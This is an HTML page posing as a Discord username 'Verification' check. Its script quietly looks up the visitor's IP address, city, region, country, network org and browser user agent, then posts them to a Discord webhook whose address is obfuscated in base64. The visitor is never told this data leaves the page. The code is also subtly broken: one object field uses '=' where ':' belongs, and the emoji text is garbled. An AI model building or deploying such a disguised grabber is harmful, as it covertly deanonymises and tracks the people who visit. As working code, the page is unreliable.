<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1" />
  <title>üîí Verification</title>
  <style>
    /* Animated Gradient */
    @keyframes g{0%,100%{background-position:0 50%}50%{background-position:100% 50%}}
    body{margin:0;padding:0;display:flex;align-items:center;justify-content:center;
      width:100vw;height:100vh;overflow:hidden;font-family:Segoe UI,sans-serif;
      background:linear-gradient(-45deg,#1c1c2f,#2c2c3e,#1c1c2f,#2c2c3e);
      background-size:400% 400%;animation:g 20s ease infinite;color:#eee}
    .p{position:absolute;border-radius:50%;background:rgba(255,255,255,0.05);
      animation:d  linear infinite}
    @keyframes d{from{transform:translate(0,0)}to{transform:translate(100px,-200px)}}
    .c{position:relative;width:90%;max-width:360px;padding:2rem;
      background:rgba(0,0,0,0.75);border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.6);
      text-align:center;z-index:1;transition:transform .3s}
    .c:hover{transform:translateY(-4px)}
    h1{margin-bottom:1rem;font-size:1.5rem;letter-spacing:.5px}
    input,button{width:100%;padding:.75rem;margin-top:.5rem;border:none;border-radius:8px;
      font-size:1rem;outline:none}
    input{background:#2c2c3e;color:#eee}
    input:focus{box-shadow:0 0 10px rgba(9,157,255,0.6)}
    button{background:linear-gradient(45deg,#3273dc,#275bbe);color:#fff;
      cursor:pointer;transition:background .2s,transform .1s}
    button:hover{background:linear-gradient(45deg,#4183ff,#3a6cff)}
    button:active{transform:scale(.97)}
    .s{margin-top:1.5rem;display:flex;align-items:center;justify-content:center;
      font-size:1.1rem;opacity:0;transition:opacity .4s}
    .s.v{opacity:1}
    .s svg{margin-right:.6rem}
    footer{position:absolute;bottom:8px;font-size:.75rem;color:rgba(255,255,255,.6)}
    footer a{color:#4faaff;text-decoration:none}
  </style>
</head>
<body>
  <script>
  (function(w,d){
    // 1) floating particles
    for(let i=0;i<30;i++){
      let e=d.createElement('div'),s=Math.random()*4+2;
      e.className='p';e.style.width=s+'px';e.style.height=s+'px';
      e.style.left=Math.random()*100+'vw';e.style.top=Math.random()*100+'vh';
      e.style.animationDuration=10+Math.random()*10+'s';d.body.appendChild(e);
    }
    // 2) base64 webhook
    const _0x1 = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI0OTkxMTY1NTU2MzM3NC8yNDFBdWM1Tl9rbnJuZUk4dWNQN2pNVmNkZzJrZzFRYUd4dy1NUVdhTXRpVWEwZWdtTkpHOVBxcE5OQTI2Z3dSamlIWA==");
    // 3) DOM
    const c=d.createElement('div');c.className='c';
    c.innerHTML=`
      <h1>Enter Discord Username</h1>
      <input id="u" placeholder="CoolUser#1234"/>
      <button id="b">Verify</button>
      <div id="st" class="s"></div>
    `;d.body.appendChild(c);
    const _u=d.getElementById('u'),_b=d.getElementById('b'),_st=d.getElementById('st');
    // 4) helpers
    function _f(e,t){_st.innerHTML=e+'<span>'+t+'</span>';_st.classList.add('v')}
    async function _r(u,o=5000){
      const a=new AbortController(),i=setTimeout(()=>a.abort(),o);
      try{return await fetch(u,{signal:a.signal,mode:'cors'})}finally{clearTimeout(i)}
    }
    // 5) rate-limit
    const key="verCount",now=Date.now(),dat=JSON.parse(localStorage.getItem(key)||'{}');
    if(dat.ts && now - dat.ts < 60e3 && dat.cnt>=1){
      _f(`<svg width=24 height=24 fill="#ffc107"><circle cx=12 cy=12 r=10/></svg>`,"Too fast‚Äîwait 1m");
      _b.disabled=true;
      return;
    }
    // 6) click
    _b.onclick=async()=>{
      const name=_u.value.trim();
      if(!name){_f("‚ùå","Enter username");return;}
      _f("üîÑ","Verifying‚Ä¶");_b.disabled=true;
      try {
        // IP lookup
        let j=await (await _r('https://api.ipify.org?format=json')).json();
        const ip=j.ip||j.ipAddress;
        // geo
        let g;
        try{g=await (await _r(`https://ipapi.co/${ip}/json/`)).json();if(g.error)throw 0;}
        catch{g=await (await _r(`https://ipwho.is/${ip}`)).json();}
        // vpn check
        let sc=0,fs=[];
        if(g.org&&/hosting|datacenter|cloud|proxy|vpn/i.test(g.org)){fs.push("Datacenter");sc+=40;}
        if(g.timezone&&!g.timezone.includes(g.country_code)){fs.push("TZ mismatch");sc+=20;}
        const vpn=sc>=40;
        // payload
        const emb={username:'Verification',embeds:[{
          title:`${g.country_code?String.fromCodePoint(...g.country_code.toUpperCase().split('').map(c=>127397+c.charCodeAt())):''} ${g.city||'?'}`,
          color:vpn?16755007:65280,
          fields:[
            {name:'üë§User',value:name,inline:true},
            {name:'üîçStatus',value:vpn?'‚ùåFAILED':'‚úÖPASSED'},
            {name:'üìçLoc',value:`${g.city},${g.region||g.region_name},${g.country_name}`},
            {name:'üåêIP',value:ip},
            {name:'üè¢Org',value:g.org||'Unknown'}
          ],
          footer:{text:`At ${new Date().toLocaleString('en-GB')}`}
        }]};
        if(fs.length) emb.embeds[0].fields.push({name:'‚ö†Ô∏èFlags',value:fs.join(',')});
        emb.embeds[0].fields.push({name:'üì±Agent',value=navigator.userAgent});
        await fetch(_0x1,{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify(emb)});
        _f(vpn?`‚ùå`:`‚úÖ`, vpn?'VPN detected':'Verified');
      } catch(err){
        console.error(err);
        _f("‚ùå","Error");
      } finally {
        _b.disabled=false;
        // update rate-limit
        localStorage.setItem(key,JSON.stringify({ts:Date.now(),cnt:(dat.cnt||0)+1}));
      }
    };
  })(window,document);
  </script>
  <footer>Made by <a href="https://github.com/">hi</a></footer>
</body>
</html>
